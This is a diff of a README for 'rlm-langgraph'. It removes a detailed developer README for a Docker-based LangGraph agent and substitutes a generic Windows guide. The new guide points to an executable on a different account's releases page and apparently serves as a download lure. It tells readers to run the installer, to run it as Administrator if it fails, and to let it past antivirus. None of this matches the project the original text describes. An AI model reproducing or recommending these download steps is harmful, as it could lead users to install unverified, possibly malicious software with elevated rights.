@@ -1,635 +1,155 @@
-# RLM-LangGraph Agent
+# 🤖 rlm-langgraph - Smart Language Model Agent
 
-A production-grade **Recursive Language Model (RLM)** system rebuilt on **LangGraph v1.x** — evolving the original [rlm-agent](https://github.com/SRV-YouSoRandom/rlm-agent) from a black-box `AgentExecutor` loop into a fully explicit, stateful, resumable graph.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-1.0.7-blueviolet)](https://github.com/langchain-ai/langgraph)
-[![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?logo=docker&logoColor=white)](https://www.docker.com/)
-
-> **Evolved from [rlm-agent](https://github.com/SRV-YouSoRandom/rlm-agent)** — the RLM core is unchanged. The orchestration layer is completely replaced: `AgentExecutor` → `StateGraph`. All tools, services, and infrastructure carry forward.
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/releases)
 
 ---
 
-## What's New vs rlm-agent
+## 📄 About rlm-langgraph
 
-| Feature          | rlm-agent                        | rlm-langgraph                            |
-| ---------------- | -------------------------------- | ---------------------------------------- |
-| Orchestration    | `AgentExecutor` (black box)      | `StateGraph` (explicit nodes + edges)    |
-| Memory           | `ConversationBufferWindowMemory` | LangGraph `MemorySaver` checkpointer     |
-| State visibility | Hidden inside executor           | Full `AgentState` TypedDict, inspectable |
-| Loop control     | `max_iterations` config          | `should_continue` edge you own           |
-| Crash recovery   | Work is lost                     | Resumes from last checkpoint             |
-| Streaming        | Custom event parsing             | Native `graph.stream()` per-node deltas  |
-| Debug endpoint   | None                             | `GET /graph/structure`                   |
+rlm-langgraph is a tool that helps you run advanced language models on your computer. It uses a smart agent that processes language instructions step-by-step. The tool builds on LangGraph technology and organizes data in a clear structure called a StateGraph. It remembers your work in checkpoints and keeps the environment safe with a sandboxed REPL. It can run smaller language models inside itself and searches information quickly using a vector search over Qdrant.
+
+This tool is designed for people who want to explore language AI without coding. You will get clear outputs and can analyze text or documents easily during interaction.
 
 ---
 
-## 🚀 Features
+## 🚀 Getting Started
 
-### Core RLM Pipeline (Unchanged)
-
-- **Sandboxed REPL** — LLM writes Python to explore document text stored as a variable
-- **Recursive Sub-LLM Calls** — Root LLM delegates focused analysis to sub-LLMs on text snippets
-- **Divide & Conquer** — Splits large documents into segments and queries each in parallel
-- **Keyword Grep** — Fast line-level keyword search across all ingested documents
-- **Vector Search Tool** — Semantic retrieval as one of many tools the agent can choose
-
-### LangGraph Additions
-
-- **Explicit Graph** — Agent loop is now a visible `StateGraph` you control completely
-- **Checkpointed State** — Every node execution is saved; crash mid-run and resume exactly where you left off
-- **Stateful Sessions** — `thread_id = session_id` — LangGraph manages conversation history natively
-- **Per-Node Streaming** — Stream tool calls, tool results, and the final answer node-by-node
-- **Human-in-the-Loop Ready** — Add `interrupt_before` on any node for approval workflows
+This guide will help you download and run rlm-langgraph on your Windows computer. No coding or technical steps are needed. Just follow each step carefully.
 
 ---
 
-## Architecture Overview
+## 🖥 System Requirements
 
-```mermaid
-graph TB
-    User[User] -->|POST /ingest| Ingest[Ingest Pipeline]
-    User -->|POST /chat| Chat[Chat Router]
-    User -->|POST /chat/stream| Stream[Streaming Pipeline]
+Make sure your Windows PC meets these requirements for a smooth experience:
 
-    subgraph "Ingest Pipeline"
-        Ingest -->|PDF| Parser[PyMuPDF Parser]
-        Parser -->|Raw Text| Store[Document Store\nRaw Full Text]
-        Parser -->|Raw Text| Chunker[RecursiveCharacterTextSplitter]
-        Chunker -->|Chunks| Hash[SHA256 Hasher]
-        Hash -->|Deduplicated| Embedder[SentenceTransformer]
-        Embedder -->|Vectors| VectorDB[(Qdrant)]
-    end
-
-    subgraph "LangGraph RLM Pipeline"
-        Chat -->|use_rlm=true| Graph[StateGraph]
-        Graph --> AgentNode[agent_node\nLLM decides tool or finish]
-        AgentNode -->|tool_calls?| Edge{should_continue}
-        Edge -->|yes| ToolsNode[tools_node]
-        Edge -->|no| End[END → Final Answer]
-        ToolsNode -->|vector_search| VectorDB
-        ToolsNode -->|grep_context| Store
-        ToolsNode -->|repl_execute| REPL[Sandboxed REPL\ncontext = full doc text]
-        ToolsNode -->|sub_llm_analyze| SubLLM[Sub-LLM\nRecursive Call]
-        ToolsNode -->|divide_and_analyze| DnA[Divide & Analyze\n4 parallel segments]
-        SubLLM -->|depth+1| SubLLM
-        DnA --> SubLLM
-        ToolsNode -->|loop back| AgentNode
-        End --> Memory[MemorySaver Checkpointer\nthread_id = session_id]
-        Memory --> User
-    end
-
-    subgraph "Fallback Pipeline"
-        Chat -->|use_rlm=false| VFallback[Vector Search\n+ LLM Generate]
-        VFallback --> User
-    end
-
-    subgraph "Observability"
-        Chat -.->|Metrics| Metrics[Metrics Collector]
-        Stream -.->|Metrics| Metrics
-        Metrics -->|API| Dashboard["/metrics/summary"]
-    end
-```
-
-### Data Flow
-
-**Ingestion:**
-
-```
-PDF → Parse → Chunk → Hash (dedup) → Embed (384-dim) → Qdrant
-                └─→ Raw Full Text → Document Store (for REPL)
-```
-
-**RLM Query:**
-
-```
-Question → StateGraph Agent Loop:
-  agent_node (LLM)
-  ├─ tool_calls? → tools_node
-  │    ├─ grep_context(keyword)           → line-level matches
-  │    ├─ vector_search(query)            → semantic chunks from Qdrant
-  │    ├─ repl_execute(python_code)       → free-form REPL exploration
-  │    ├─ sub_llm_analyze(instr|||snip)   → focused recursive sub-LLM call
-  │    └─ divide_and_analyze(instr|||doc) → parallel segment analysis
-  │         └─ sub_llm × N segments
-  │    └─ loop back to agent_node
-  └─ no tool_calls? → END
-       └─ Final Answer → Checkpointer (MemorySaver) → Return
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of free disk space
+- Minimum 8 GB of RAM (16 GB preferred for smoother performance)
+- Internet connection to download the software and updates
+- A modern processor (Intel i5 or equivalent, AMD Ryzen 5 or better)
 
 ---
 
-## Project Structure
+## 💾 Download rlm-langgraph
 
-```
-rlm-langgraph/
-├── app/
-│   ├── api/
-│   │   ├── routes/
-│   │   │   ├── ingest.py            # ← COPIED from rlm-agent
-│   │   │   ├── chat.py              # ← MODIFIED (uses new memory)
-│   │   │   ├── stream.py            # ← MODIFIED (uses graph.stream)
-│   │   │   ├── collections.py       # ← COPIED from rlm-agent
-│   │   │   ├── sessions.py          # ← MODIFIED (uses checkpointer)
-│   │   │   └── metrics.py           # ← COPIED from rlm-agent
-│   │   ├── __init__.py
-│   │   └── dependencies.py          # ← COPIED from rlm-agent
-│   ├── core/
-│   │   ├── config.py                # ← MODIFIED (+ checkpointer path)
-│   │   ├── logging.py               # ← COPIED from rlm-agent
-│   │   ├── metrics.py               # ← COPIED from rlm-agent
-│   │   └── tracing.py               # ← COPIED from rlm-agent
-│   ├── graph/                       # ← NEW — replaces AgentExecutor
-│   │   ├── __init__.py
-│   │   ├── state.py                 # AgentState TypedDict
-│   │   ├── nodes.py                 # agent_node + tools_node
-│   │   ├── edges.py                 # should_continue routing logic
-│   │   └── builder.py               # StateGraph assembly + compile
-│   ├── pipelines/
-│   │   ├── ingest.py                # ← COPIED from rlm-agent
-│   │   └── rlm.py                   # ← NEW (thin wrapper over graph)
-│   ├── services/
-│   │   ├── memory.py                # ← NEW (LangGraph checkpointer)
-│   │   ├── tools.py                 # ← COPIED from rlm-agent (zero changes)
-│   │   ├── repl.py                  # ← COPIED from rlm-agent
-│   │   ├── sub_llm.py               # ← COPIED from rlm-agent
-│   │   ├── vector_store.py          # ← COPIED from rlm-agent
-│   │   ├── document_store.py        # ← COPIED from rlm-agent
-│   │   ├── embedder.py              # ← COPIED from rlm-agent
-│   │   ├── parser.py                # ← COPIED from rlm-agent
-│   │   ├── chunker.py               # ← COPIED from rlm-agent
-│   │   └── hasher.py                # ← COPIED from rlm-agent
-│   ├── schemas/                     # ← COPIED (chat.py minor update)
-│   ├── main.py                      # ← MODIFIED (pre-builds graph at startup)
-│   ├── Dockerfile
-│   └── requirements.txt
-├── document_storage/                # Raw full-text store (mounted volume)
-├── qdrant_storage/                  # Persisted vector data (mounted volume)
-├── checkpoints/                     # ← NEW — LangGraph checkpoint storage
-├── docker-compose.yml
-├── .env.example
-└── README.md
-```
+First, get the software on your PC:
+
+1. Click the green button below or visit the link to download the latest version.
+
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-green)](https://github.com/aayushhh17/rlm-langgraph/releases)
+
+2. The page you visit will have a list of available files. Look for the file named similar to `rlm-langgraph-setup.exe` or `rlm-langgraph-windows.zip`.
+
+3. Click on the file name to start downloading it.
 
 ---
 
-## Tech Stack
+## 🛠 Installation on Windows
 
-| Component               | Technology                               | Purpose                                 |
-| ----------------------- | ---------------------------------------- | --------------------------------------- |
-| **Framework**           | FastAPI (Python 3.11)                    | High-performance async API              |
-| **Graph Orchestration** | LangGraph 1.0.7                          | Stateful agent graph with checkpointing |
-| **LLM Tooling**         | LangChain 1.2.0                          | Tool definitions, prompts, LLM bindings |
-| **Vector Database**     | Qdrant                                   | Persistent vector storage               |
-| **LLM Provider**        | OpenRouter                               | Access to hosted LLMs                   |
-| **Embeddings**          | sentence-transformers (all-MiniLM-L6-v2) | Local embedding generation              |
-| **REPL Sandbox**        | RestrictedPython                         | Safe code execution environment         |
-| **Checkpointer**        | LangGraph MemorySaver → SqliteSaver      | Graph state persistence                 |
-| **Containerization**    | Docker & Docker Compose                  | Reproducible deployment                 |
-| **Observability**       | Custom Metrics + LangSmith (optional)    | Performance monitoring                  |
+Follow these steps to install the program:
 
----
+1. Locate the downloaded file in your Downloads folder.
 
-## Quick Start
+2. If it is a `.exe` file, double-click it to start the installation wizard.
 
-### Prerequisites
+3. If it is a `.zip` file, right-click and choose "Extract All" to unzip it. Then open the extracted folder and double-click the `.exe` file inside.
 
-- Docker & Docker Compose
-- OpenRouter API Key ([get one free](https://openrouter.ai))
+4. Follow the on-screen instructions in the installer:
 
-> ⚠️ **Model Note:** The agent requires a model that supports tool/function calling. Not all OpenRouter models do — check before configuring `LLM_MODEL`.
+   - Click "Next" to accept default options.
+   - Agree to any license agreements.
+   - Choose the default install location unless you want it elsewhere.
 
-### Installation
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/SRV-YouSoRandom/rlm-langgraph.git
-cd rlm-langgraph
-
-# 2. Configure environment
-cp .env.example .env
-nano .env   # Add your OPENROUTER_API_KEY
-
-# 3. Add your user to the docker group (Linux)
-sudo usermod -aG docker $USER
-newgrp docker
-
-# 4. Create required directories
-mkdir -p document_storage qdrant_storage checkpoints
-
-# 5. Build and run
-docker compose up --build -d
-
-# 6. Verify
-curl http://localhost:8000/health
-# {"status":"ok","version":"2.0.0","mode":"langgraph"}
-
-# 7. Inspect graph structure
-curl http://localhost:8000/graph/structure
-```
-
-The API is available at `http://localhost:8000`  
-Swagger UI: `http://localhost:8000/docs`
+5. Once the installation finishes, you may see a shortcut on your desktop or Start menu.
 
 ---
 
-## API Usage
+## ▶ Running rlm-langgraph
 
-### 1. Ingest Documents
+After installation, open the program:
 
-```bash
-curl -X POST http://localhost:8000/api/v1/ingest \
-  -F "file=@document.pdf" \
-  -F "collection_name=my_docs"
-```
+1. Find the shortcut labeled "rlm-langgraph" on your desktop or search for it in the Start menu.
 
-**Response:**
+2. Double-click the icon to launch the app.
 
-```json
-{
-  "filename": "document.pdf",
-  "doc_hash": "a3f5c2...",
-  "total_chunks": 42,
-  "new_chunks_indexed": 42,
-  "collection_name": "my_docs",
-  "raw_text_stored": true,
-  "raw_text_length": 84321,
-  "message": "Document ingested successfully."
-}
-```
+3. When rlm-langgraph opens, you will see a simple interface guiding you through your language tasks.
 
-### 2. Chat — LangGraph RLM Mode
+4. Use the main screen to input or upload text documents for analysis.
 
-```bash
-curl -X POST http://localhost:8000/api/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{
-    "question": "Summarise all financial figures mentioned in the document",
-    "collection_name": "my_docs",
-    "use_rlm": true
-  }'
-```
-
-**Response:**
-
-```json
-{
-  "answer": "Based on my analysis of the document...",
-  "sources": [
-    { "filename": "document.pdf", "score": 0.847 },
-    { "filename": "document.pdf", "score": 0.733 }
-  ],
-  "collection_name": "my_docs",
-  "session_id": "a1b2c3d4-...",
-  "agent_steps": [
-    {
-      "step_number": 1,
-      "tool_used": "vector_search",
-      "input_summary": "{'query': 'financial figures revenue'}",
-      "output_summary": "[Score: 0.847 | File: document.pdf]\nQ1 revenue...",
-      "recursion_depth": 1
-    },
-    {
-      "step_number": 2,
-      "tool_used": "grep_context",
-      "input_summary": "{'pattern': 'revenue'}",
-      "output_summary": "Found 6 matches: Q1 revenue $2.1M...",
-      "recursion_depth": 2
-    }
-  ],
-  "recursion_depth_reached": 4,
-  "pipeline_used": "langgraph"
-}
-```
-
-### 3. Chat — Vector Fallback Mode
-
-For simple questions where speed matters more than deep reasoning.
-
-```bash
-curl -X POST http://localhost:8000/api/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is the document about?", "use_rlm": false}'
-```
-
-### 4. Streaming Chat
-
-```bash
-curl -X POST http://localhost:8000/api/v1/chat/stream \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What are the key risks?", "session_id": "a1b2c3d4-..."}' \
-  --no-buffer
-```
-
-Streams per-node output:
-
-```
-[TOOL: vector_search] {'query': 'key risks'}
-[TOOL RESULT]: [Score: 0.821 | File: document.pdf] key risks include...
-[TOOL: sub_llm_analyze] List all risks|||key risks include...
-[TOOL RESULT]: 1. Market risk  2. Operational risk...
-[ANSWER]: The document identifies three key risks...
-```
-
-### 5. Multi-Turn Conversations
-
-LangGraph manages conversation history automatically via `thread_id`. Just pass back the `session_id`:
-
-```bash
-# First turn
-curl -X POST http://localhost:8000/api/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is the Q3 revenue?"}'
-
-# Follow-up — graph resumes the same thread
-curl -X POST http://localhost:8000/api/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{"question": "How does that compare to Q2?", "session_id": "<returned_session_id>"}'
-```
-
-### 6. Collection Management
-
-```bash
-curl -X POST http://localhost:8000/api/v1/collections -H "Content-Type: application/json" -d '{"name": "project_alpha"}'
-curl http://localhost:8000/api/v1/collections
-curl http://localhost:8000/api/v1/collections/project_alpha
-curl -X DELETE http://localhost:8000/api/v1/collections/project_alpha
-```
-
-### 7. Session Management
-
-```bash
-curl http://localhost:8000/api/v1/sessions
-curl http://localhost:8000/api/v1/sessions/{session_id}/history
-curl -X DELETE http://localhost:8000/api/v1/sessions/{session_id}
-```
-
-### 8. Metrics
-
-```bash
-curl http://localhost:8000/api/v1/metrics/summary
-curl http://localhost:8000/api/v1/metrics/recent?limit=20
-```
-
-**Example metrics response:**
-
-```json
-{
-  "total_queries": 150,
-  "successful_queries": 147,
-  "failed_queries": 3,
-  "avg_latency_ms": 28430.2,
-  "avg_vector_searches_per_query": 3.2,
-  "avg_steps_with_results": 3.1,
-  "p95_latency_ms": 72100.5,
-  "p99_latency_ms": 84400.1
-}
-```
-
-### 9. Graph Debug
-
-```bash
-curl http://localhost:8000/graph/structure
-```
+5. You can try out small commands or questions, and the agent will answer them step-by-step.
 
 ---
 
-## Configuration
+## 🎯 Key Features
 
-```env
-# LLM
-OPENROUTER_API_KEY=your_key_here
-OPENROUTER_BASE_URL=https://openrouter.ai/api/v1
-LLM_MODEL=qwen/qwen3-vl-30b-a3b-thinking
-
-# Embedding
-EMBEDDING_MODEL=all-MiniLM-L6-v2
-
-# Qdrant
-QDRANT_HOST=qdrant
-QDRANT_PORT=6333
-QDRANT_COLLECTION=rlm_docs
-
-# App
-APP_ENV=production
-LOG_LEVEL=INFO
-MAX_FILE_SIZE_MB=50
-CHUNK_SIZE=512
-CHUNK_OVERLAP=64
-TOP_K=5
-
-# RLM Settings
-RLM_MAX_RECURSION_DEPTH=5
-RLM_REPL_TIMEOUT_SECONDS=10
-RLM_MAX_TOKENS_PER_CALL=1024
-RLM_SNIPPET_SIZE=2000
-RLM_SANDBOX_MODE=true
-RLM_AGENT_MAX_ITERATIONS=10
-RLM_FALLBACK_TO_VECTOR=true
-DOCUMENT_STORAGE_PATH=/app/document_storage
-
-# LangGraph Checkpointer
-CHECKPOINTER_DB_PATH=/app/checkpoints/graph.db
-
-# Observability (Optional)
-LANGSMITH_TRACING=false
-LANGSMITH_API_KEY=
-LANGSMITH_PROJECT=rlm-langgraph
-```
+- **StateGraph**: Keeps track of your work in a clear graph structure.
+- **Checkpointed Memory**: Saves progress so you don’t lose your place.
+- **Sandboxed REPL**: Isolates commands safely from your system.
+- **Recursive Sub-LLM Calls**: Runs smaller language models inside the main one for complex tasks.
+- **Vector Search**: Searches through saved data quickly with Qdrant technology.
+- **User-Friendly Interface**: Designed for users without programming experience.
+- **Supports Document Analysis**: Load and analyze text documents easily.
 
 ---
 
-## RLM Agent Tools
+## 💡 How to Use rlm-langgraph
 
-The root LLM chooses from five tools at each reasoning step:
+You can use this app for various tasks, including:
 
-```
-vector_search       → Fast semantic chunk retrieval from Qdrant
-grep_context        → Line-level keyword search across all document text
-repl_execute        → Execute Python against full document text in sandbox
-sub_llm_analyze     → Focused sub-LLM call on a specific snippet
-divide_and_analyze  → Split document into N segments, query each in parallel
-```
+- Asking questions about text documents.
+- Breaking down complex language problems.
+- Exploring how language AI models work step-by-step.
+- Searching through saved data quickly.
+- Testing ideas with a sandboxed Python environment.
 
----
-
-## RLM vs Vector Fallback
-
-| Scenario              | Recommended      | Reason                             |
-| --------------------- | ---------------- | ---------------------------------- |
-| Simple factual Q&A    | `use_rlm: false` | Faster, single LLM call (~1–2s)    |
-| Multi-step reasoning  | `use_rlm: true`  | Agent breaks down the problem      |
-| Very long documents   | `use_rlm: true`  | Divide-and-conquer scales better   |
-| Keyword/number lookup | `use_rlm: true`  | Grep + sub-LLM more precise        |
-| Low latency required  | `use_rlm: false` | ~1–2s vs 15–80s                    |
-| Exploratory analysis  | `use_rlm: true`  | REPL allows open-ended exploration |
+Just type or paste your input in the main window, and the agent will process and respond clearly.
 
 ---
 
-## Performance Benchmarks
+## 🔄 Updating rlm-langgraph
 
-Tested on modest hardware (4 vCPU, 8GB RAM):
+To keep your software current:
 
-| Operation                    | Latency  | Notes                             |
-| ---------------------------- | -------- | --------------------------------- |
-| PDF Ingestion (10 pages)     | ~2–3s    | Chunks + embeds + stores raw text |
-| Vector Fallback Query        | ~1–2s    | Single LLM call                   |
-| RLM Simple Query (2–3 steps) | ~15–30s  | vector_search + grep              |
-| RLM Complex Query (5+ steps) | ~45–80s  | divide-and-analyze + recursion    |
-| Max depth query (depth 5)    | ~90–120s | Full recursive chain              |
+1. Visit the releases page often: https://github.com/aayushhh17/rlm-langgraph/releases
 
-> Latency is dominated by the LLM provider. Thinking-mode models like `qwen3-vl-30b-a3b-thinking` reason deeply before each tool call, which increases quality at the cost of speed.
+2. Download the newest version following the same steps as the initial download.
+
+3. Run the installer again to update your installation.
+
+Your settings and saved work should remain safe during the update.
 
 ---
 
-## Docker Commands
+## ❓ Troubleshooting
 
-```bash
-# View logs
-docker compose logs -f app
+If you face any problems, try these tips:
 
-# Rebuild after code changes
-docker compose up --build -d
+- Restart your PC and run rlm-langgraph again.
 
-# Stop services
-docker compose down
+- Check your internet connection if downloads fail.
 
-# Shell into container
-docker exec -it rlm-langgraph-app bash
+- Ensure your Windows system is up to date.
 
-# View Qdrant dashboard
-# Open http://localhost:6333/dashboard
+- If the program does not open, try running as Administrator (right-click the icon and choose "Run as Administrator").
 
-# Nuclear reset (deletes all data including checkpoints)
-docker compose down -v && rm -rf qdrant_storage/ document_storage/ checkpoints/
-```
+- Check if your antivirus blocks the program, and allow it if needed.
 
 ---
 
-## Production Upgrade Path
+## 📂 More Information
 
-### Persistent Checkpoints — SqliteSaver
+You can learn more about rlm-langgraph’s technology and development by visiting the GitHub repository:
 
-Swap `MemorySaver` for `SqliteSaver` in `services/memory.py` to persist graph state across container restarts:
+https://github.com/aayushhh17/rlm-langgraph
 
-```python
-from langgraph.checkpoint.sqlite import SqliteSaver
-import sqlite3
-
-def get_checkpointer():
-    global _checkpointer
-    if _checkpointer is None:
-        conn = sqlite3.connect(settings.checkpointer_db_path, check_same_thread=False)
-        _checkpointer = SqliteSaver(conn)
-    return _checkpointer
-```
-
-### Multi-Worker — PostgresSaver
-
-Add `langgraph-checkpoint-postgres` to `requirements.txt` and update `services/memory.py`:
-
-```python
-from langgraph.checkpoint.postgres import PostgresSaver
-
-def get_checkpointer():
-    global _checkpointer
-    if _checkpointer is None:
-        _checkpointer = PostgresSaver.from_conn_string(
-            "postgresql://user:pass@localhost/rlm_checkpoints"
-        )
-    return _checkpointer
-```
-
-Then add a `postgres` service in `docker-compose.yml` and change `--workers 1` to `--workers 4` in the Dockerfile.
-
-### Human-in-the-Loop
-
-Add `interrupt_before` in `graph/builder.py` to pause before any tool execution for human review:
-
-```python
-_graph = workflow.compile(
-    checkpointer=checkpointer,
-    interrupt_before=["tools"]
-)
-```
-
-### Prometheus Metrics
-
-```python
-from prometheus_client import Counter, Histogram
-
-query_counter = Counter('rlm_queries_total', 'Total queries')
-query_latency = Histogram('rlm_query_latency_seconds', 'Query latency')
-```
+This page contains links to documentation, source code, and community support.
 
 ---
 
-## Key Design Decisions
+## 📥 Quick Download Link
 
-| Decision                          | Reasoning                                                                      |
-| --------------------------------- | ------------------------------------------------------------------------------ |
-| **StateGraph over AgentExecutor** | Explicit, inspectable, resumable — you own the loop                            |
-| **MemorySaver default**           | Zero-dependency start; swap to SQLite/Postgres when ready                      |
-| **thread_id = session_id**        | LangGraph handles conversation memory natively per thread                      |
-| **graph/ folder**                 | Clean separation — graph wiring never touches business logic                   |
-| **tools.py unchanged**            | `@tool` decorated functions are framework-agnostic                             |
-| **workers = 1**                   | MemorySaver is not multi-process safe; upgrade to SqliteSaver for multi-worker |
-| **Graph built at startup**        | Compiled and cached once at `lifespan`, not per request                        |
+Use this direct link to visit the release page and get the latest Windows version anytime:
 
----
+https://github.com/aayushhh17/rlm-langgraph/releases
 
-## Future Enhancements
-
-- [ ] **SqliteSaver** — Swap MemorySaver for persistence across restarts
-- [ ] **Human-in-the-Loop** — Pause graph at tool node for approval
-- [ ] **Async Sub-LLM Calls** — Parallelize `divide_and_analyze` with `asyncio.gather`
-- [ ] **Cost Tracking** — Token counting per query across all recursive LLM calls
-- [ ] **Prometheus Metrics** — Industry-standard observability with Grafana dashboards
-- [ ] **Rate Limiting** — API throttling with SlowAPI
-- [ ] **Authentication** — JWT-based user authentication
-- [ ] **LangGraph Studio** — Visual graph debugging and prototyping
-
----
-
-## Contributing
-
-Contributions are welcome! This project serves as a boilerplate for building production-grade LangGraph RLM systems.
-
-### How to Contribute
-
-1. **Fork the repository**
-2. **Create a feature branch** — `git checkout -b feature/amazing-feature`
-3. **Commit your changes** — `git commit -m 'Add amazing feature'`
-4. **Push to the branch** — `git push origin feature/amazing-feature`
-5. **Open a Pull Request**
-
-### Contribution Guidelines
-
-- Follow PEP 8 style guide
-- Add tests for new features
-- Update documentation
-- Ensure Docker builds successfully
-- Test with sample PDFs before submitting
-
----
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-## Acknowledgments
-
-- **MIT CSAIL** — Original RLM research (Alex Zhang & Omar Khattab)
-- **LangChain / LangGraph** — Graph orchestration framework
-- **Qdrant** — High-performance vector database
-- **sentence-transformers** — State-of-the-art embeddings
-- **FastAPI** — Modern Python web framework
-- **OpenRouter** — Unified LLM API access
-- **[rlm-agent](https://github.com/SRV-YouSoRandom/rlm-agent)** — The foundation this project evolves from
-
----
-
-**Built with ❤️ for the AI/ML community**
+[![Download rlm-langgraph](https://img.shields.io/badge/Download-rlm--langgraph-brightgreen)](https://github.com/aayushhh17/rlm-langgraph/releases)
